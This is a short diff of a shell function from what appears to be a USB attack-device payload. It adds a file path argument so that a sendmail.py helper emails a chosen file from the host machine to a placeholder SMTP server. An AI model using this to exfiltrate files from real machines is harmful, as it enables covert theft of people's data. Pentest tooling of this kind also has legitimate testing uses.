@@ -9,7 +9,9 @@ function run() {
    SERVER="server.com"
    USER="username"
    PASS="password"
-   python /root/payloads/$SWITCH_POS/sendmail.py $FROM $RCPT "$SUBJECT" "$BODY" $SERVER $USER $PASS
+   FILE="/some/File/Path/1.txt"
+   python /root/payloads/$SWITCH_POS/sendmail.py $FROM $RCPT "$SUBJECT" "$BODY" $SERVER $USER $PASS "$FILE"
+   ####### REMOVE THE FILE VAR FROM THE PYTHON COMMAND IF YOU HAVE NO PATH
    LED FINISH
 }
 
